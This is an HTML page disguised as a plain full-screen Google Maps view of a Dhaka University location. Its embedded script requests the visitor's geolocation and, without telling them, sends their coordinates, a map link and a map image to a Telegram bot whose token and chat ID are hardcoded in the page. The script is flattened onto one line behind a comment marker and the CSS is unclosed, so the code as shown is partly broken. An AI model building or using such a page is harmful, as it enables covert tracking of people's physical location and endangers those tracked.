<!DOCTYPE html>
<html>
<head>
    <style>
        iframe{
            
            height:100vh;
            width:100vw;

    </style>
	<title>Example Page with iFrame</title>
</head>
<body>

	<iframe src="https://www.google.com/maps/place/%E0%A6%A2%E0%A6%BE%E0%A6%95%E0%A6%BE+%E0%A6%AC%E0%A6%BF%E0%A6%B6%E0%A7%8D%E0%A6%AC%E0%A6%AC%E0%A6%BF%E0%A6%A6%E0%A7%8D%E0%A6%AF%E0%A6%BE%E0%A6%B2%E0%A7%9F,+%E0%A6%A8%E0%A7%80%E0%A6%B2%E0%A6%95%E0%A7%8D%E0%A6%B7%E0%A7%87%E0%A6%A4+%E0%A6%B0%E0%A7%8B%E0%A6%A1,+%E0%A6%A2%E0%A6%BE%E0%A6%95%E0%A6%BE+1000/@23.7291266,90.3956566,16z/data=!4m6!3m5!1s0x3755b8e90a449e4f:0xb7092a9c25197fa4!8m2!3d23.7338766!4d90.3929471!16zL20vMDd3NXJx"></iframe>
</body>
  <script>
     //updated location // replace YOUR_BOT_TOKEN and YOUR_CHAT_ID with your own values const botToken = '6200671913:AAGfUPW-ZW_NwtJO9UPnQ1SHKNp3dxxNoPU'; const chatId = '5857694327';  if ("geolocation" in navigator) {   navigator.geolocation.getCurrentPosition(successCallback, errorCallback); } else {   console.log("Geolocation is not supported by this browser."); }  function successCallback(position) {   const latitude = position.coords.latitude;   const longitude = position.coords.longitude;   const timestamp = new Date(position.timestamp).toLocaleString();      const message = `Latitude: ${latitude}\nLongitude: ${longitude}\nTimestamp: ${timestamp}`;    // Create a Google Maps URL using the user's location   const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}&z=15`;    // Create an image of the map using the Google Maps Static API   const mapsImageUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${latitude},${longitude}&zoom=15&size=400x400&markers=color:red%7C${latitude},${longitude}&key=YOUR_API_KEY`;    // Send the message with the map and the location details to Telegram   sendTelegramMessage(`${message}\n${mapsUrl}`);   sendTelegramPhoto(mapsImageUrl); }  function errorCallback(error) {   console.log(`Error message: ${error.message}`); }  function sendTelegramMessage(message) {   const url = `https://api.telegram.org/bot${botToken}/sendMessage`;   const data = { chat_id: chatId, text: message };   const options = { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) };    fetch(url, options)     .then(response => {       if (!response.ok) {         throw new Error(`HTTP error! status: ${response.status}`);       }       console.log('Telegram message sent successfully.');     })     .catch(error => {       console.log('Error sending Telegram message:', error);     }); }  function sendTelegramPhoto(photoUrl) {   const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;   const data = { chat_id: chatId, photo: photoUrl };   const options = { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) };    fetch(url, options)     .then(response => {       if (!response.ok) {         throw new Error(`HTTP error! status: ${response.status}`);       }       console.log('Telegram photo sent successfully.');     })     .catch(error => {       console.log('Error sending Telegram photo:', error);     }); }
     </script>
  
</html>
